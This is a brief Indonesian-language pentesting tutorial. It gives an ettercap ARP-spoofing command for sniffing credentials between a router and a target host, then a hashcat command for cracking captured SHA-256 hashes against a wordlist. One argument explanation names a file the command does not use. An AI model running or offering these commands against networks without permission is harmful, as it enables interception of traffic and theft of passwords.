# Pre Pentesting
1. Siapkan worldlist / kumpulan dari password, dapat dilakukan secara manual atau menggunakan tools yang sudah ada

# Pentesting Router password using hashcat + Ettercap
1. Lakukan sniffing pada router menggunakan ettercap
```
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.28//
```
* eth0 adalah interface yang digunakan dalam melakukan sniffing
* 192.168.1.1 adalah gateway dari router
* 192.168.1.28 adalah alamat ip dari target sniffing
* Untuk mengetahui alamat ip target dapat melakukan scanning menggunakan Angry IP Scanner

2. Setelah berhasil melakukan sniffing, cek apakah ada username dan password yang didapatkan. Jika password dalam bentuk hash maka perlu untuk melakukan brute force menggunakan hashcat.
   simpan hash dalam file txt
```
hashcat -m 1400 router.txt hack.txt
```
* -m 1400 merupakah tipe hash yang akan di lakukan pentesting
* windows.txt merupakah file hash dari windows
* hack.txt merupakah wordlist yang telah dibuat
